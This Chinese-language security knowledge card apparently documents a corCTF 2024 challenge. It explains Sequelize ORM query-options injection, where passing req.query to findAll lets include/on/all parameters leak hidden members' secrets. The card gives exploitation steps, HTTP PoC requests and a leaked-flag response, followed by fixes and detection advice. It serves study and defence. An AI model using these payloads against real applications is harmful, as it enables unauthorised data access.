---
id: web-nodejs-sequelize-findall-query-options-include-on-injection
title: Sequelize findAll(req.query) 查询选项注入：include/on 越权读取被踢成员的 secret
type: scenario
domain: web
path: web/nodejs
technique: sequelize-findall-query-options-include-on-injection
aliases:
- Sequelize 查询选项注入
- findAll(req.query)
- include[association]
- include[on]
- eager loading 注入
- corCTF 2024 erm
tags:
- web
- nodejs
- sequelize
- orm
- query-options
- include
- eager-loading
- data-exposure
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V273
  verified_at: '2026-11-07T23:10:31+08:00'
  notes: 已对照原文核对：app.js findAll(req.query)、include[association]=Member&include[on][username]=goroo 返回 goroo.secret 的截图、include[all]=All 三层递归返回 secret 的截图均一致；与 SQL 注入的区分描述正确。未验证点：include[on][kicked]=1 与 attributes/order 等扩展用法原文未逐一截图，属合理外推。
---

## 一句话结论

Express 路由把 `req.query` 原样传给 `Model.findAll(options)` 时，攻击者可以用 `include[association]=Member&include[on][username]=goroo` 让 Sequelize 预先加载关联的 Member 模型并附加 `on` 连接条件，从而读取被应用过滤掉的 `kicked=true` 成员及其 `secret`（flag）；也可用嵌套 `include[all]=All` 递归加载所有关联达到同样效果。

## 原理

- **查询选项即 API**：Sequelize 的 `findAll(options)` 支持 `where`、`include`、`attributes`、`limit`、`order` 等大量选项。Express 的 query parser 会把 `include[association]=Member` 解析成 `{ include: { association: 'Member' } }`，把 `include[on][username]=goroo` 解析成 `{ include: { on: { username: 'goroo' } } }`。
- **include 预加载关联模型**：模型定义了 `Writeup.belongsTo(Member)` 等关联，`include: Member` 会 JOIN Member 表并把成员字段放进返回对象的 `Member` 属性；`toJSON()` 会把关联对象一并序列化，应用只预期返回 writeup 公开字段，却把成员 `secret` 也带出。
- **on 追加连接条件**：`include.on` 可以给 JOIN 增加条件；攻击者用 `on: { username: 'goroo' }` 或 `on: { kicked: 1 }` 精确选中被踢成员/隐藏记录，绕过其他接口写死的 `where: { kicked: false }`。
- **all 递归预加载**：`include: { all: true }` 会包含所有关联；由于 query string 只能传字符串，`all=All` 这类非空字符串在 JS 中为 truthy，Sequelize 会按“全部关联”处理。多层 `include[include][all]=All` 可沿 Writeup→Member→Category→Member 递归，最终把 goroo 及其 secret 带出。
- **为什么危险**：ORM 的查询选项是给开发者用的强大接口，不是给最终用户的输入；把 `req.query` 直接当 options 等于把 JOIN、字段选择、过滤条件全部交给攻击者，形成“ORM 查询选项注入/批量赋值”，可越权读取任意关联模型的敏感字段。
- **与 SQL 注入的区别**：应用仍然使用参数化查询，没有拼接 SQL；问题在于选项对象的结构和值完全由用户控制，导致语义层面的越权。

## 触发条件

- Node.js + Express（或其他会把嵌套 query 解析成对象的框架）+ Sequelize v6。
- 路由直接把 `req.query` 传给 `findAll`/`findOne`，或把请求参数无白名单地合并进 options。
- 模型之间存在关联（belongsTo/hasMany/belongsToMany），且关联模型含敏感字段（secret、password、token 等）。
- 返回结果直接 `toJSON()`/序列化，应用未做字段白名单。

## 利用步骤

1. 找到 `Model.findAll(req.query)` 的路由，观察正常查询参数（如 `?where[category]=web`）。
2. 先尝试 `?include=Member`、`?include[]=Member`、`?include[association]=Member`，确认返回中出现 `Member` 对象。
3. 用 `on` 过滤隐藏成员：`?include[association]=Member&include[on][username]=goroo` 或 `?include[association]=Member&include[on][kicked]=1`，在响应中查找 `secret`/flag。
4. 若关联名/结构未知，尝试 `?include[all]=All`、`?include[include][all]=All`、`?include[include][include][all]=All` 递归加载所有关联；观察响应层级中的 `Member.secret`。
5. 也可尝试 `attributes` 选择隐藏字段、`where` 绕过业务过滤、`order`/`limit` 改变查询语义。
6. 记录请求/响应作为越权证据；不要批量导出无关数据。

## PoC

```http
GET /api/writeups?include[association]=Member&include[on][username]=goroo HTTP/1.1
Host: target
```

```http
GET /api/writeups?include[association]=Member&include[on][kicked]=1 HTTP/1.1
Host: target
```

```http
GET /api/writeups?include[all]=All&include[include][all]=All&include[include][include][all]=All HTTP/1.1
Host: target
```

```json
{
  "writeups": [
    {
      "id": 5,
      "title": "...",
      "Member": {
        "username": "goroo",
        "secret": "corctf{erm?_more_like_orm_amiright?}",
        "kicked": true
      }
    }
  ]
}
```

## 变体与关联

- **选项变体**：`attributes` 选择未在页面展示的列；`where` 覆盖业务过滤；`include.where`/`include.on` 组合；`order`/`limit`/`offset` 改变结果集；`raw`/`nest` 影响序列化结构。
- **关联变体**：`include[all]=All` 递归加载所有关联；`include[include][...]` 多层嵌套；多对多中间表也会被带出。
- **框架变体**：TypeORM、Prisma、Mongoose 等也可能把用户输入直接当查询选项；任何“把 request 对象合并进 ORM options”的写法都值得审计。
- **关联卡片**：[[web-generic-sqli-nocobase-myinappchannels-sequelize-literal]]（Sequelize.literal 原始 SQL 注入）、[[web-nodejs-ioredis-zadd-array-argument-injection]]（同场比赛的 Redis 客户端参数注入，同属“用户输入直达库选项”）、[[web-generic-auth-chartbrew-legacy-dashboard-team-role-idor-password-leak]]（关联模型/字段越权读取的另一案例）。
- **边界**：路由对 query 做白名单/结构化校验、只允许固定 where 字段、模型层 `attributes` 排除敏感列、或在序列化时做字段白名单时，本链不成立。

## 检测与防御

- **修复**：不要把 `req.query` 直接传给 ORM；用显式 schema（如 zod/joi）校验并只取允许的字段；查询选项由服务端构造，`include` 用固定关联白名单。
- **字段层**：对返回模型做序列化白名单（只输出 title/slug/content/date 等），敏感字段（secret、password、token）默认 `attributes: { exclude: [...] }` 或在模型层隐藏。
- **授权层**：行级权限在服务端 `where` 中强制（如 `kicked: false`），不能依赖客户端传参；对关联模型的读取做单独授权。
- **检测**：请求 query 中出现 `include`、`all`、`on`、`attributes`、`where` 等 ORM 选项键；响应体出现 `secret`/`password` 等敏感字段；同一接口返回结构随 query 参数大幅变化。
